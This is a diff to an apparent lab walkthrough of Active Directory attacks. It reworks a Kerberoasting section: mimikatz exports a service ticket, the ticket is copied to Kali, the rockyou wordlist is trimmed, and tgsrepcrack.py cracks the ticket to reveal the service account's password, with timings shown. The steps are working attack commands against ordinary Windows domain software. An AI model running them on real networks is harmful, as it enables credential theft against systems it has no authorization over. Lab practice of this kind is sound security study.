@@ -727,22 +727,62 @@ mimikatz # kerberos::list /export
    Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; ERROR kuhl_m_kerberos_list ; kull_m_file_writeData (0x00000005)
 ```
 
-### 3.1.3. Upload the ticket to Kali
+### 3.1.3. Crack the ticket to retrieve service account password (brute force)
+
+#### Upload the ticket to Kali
 
 ```console
 scp <ticket> kali@kali.vx:/home/kali/
 ```
 
-### 3.1.4. Crack the ticket to retrieve service account password (brute force)
+#### Install kerberoast module
+
+```console
+sudo apt -y install kerberoast
+```
+
+#### Prepare word list
+
+- Unpack existing `rockyou.txt` (❗14 million entries❗)
 
 ```console
 ┌──(kali㉿kali)-[~]
 └─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+```
 
+- Using the original `rockyou.txt` will take a long time
+- The rockyou list is sorted by popularity, use `head` to extract the top passwords for a more efficient crack (if the password is not in the top 100,000, probably bruteforce isn't the way to go)
+
+```console
 ┌──(kali㉿kali)-[~]
-└─$ python3 /usr/share/kerberoast/tgsrepcrack.py /usr/share/wordlists/rockyou.txt 4-40a10000-mike@MSSQLSvc~svr.lab.vx~1433-LAB.VX.kirbiCracking 1 tickets...
+└─$ sudo head -n 100000 /usr/share/wordlists/rockyou.txt >> rockyou.100k
+```
+
+- Time taken for kerberoast:
+
+| Number of passwords | Time taken |
+|---|---|
+| 10,000 | 0m4.974s |
+| 100,000 | 0m47.707s |
+| 1000,000 | 8m14.453s |
+
+#### Crack the ticket
+
+```console
+┌──(kali㉿kali)-[~]
+└─$ time python3 /usr/share/kerberoast/tgsrepcrack.py rockyou.10k 4-40a10000-mike@MSSQLSvc~svr.lab.vx~1433-LAB.VX.kirbi
+
+
+    USE HASHCAT, IT'S HELLA FASTER!!
+
+
+Cracking 1 tickets...
 found password for ticket 0: P@ssw0rd  File: 4-40a10000-mike@MSSQLSvc~svr.lab.vx~1433-LAB.VX.kirbi
 Successfully cracked all tickets
+
+real    0m4.974s
+user    0m4.961s
+sys     0m0.012s
 ```
 
 ## 3.2. Silver Ticket
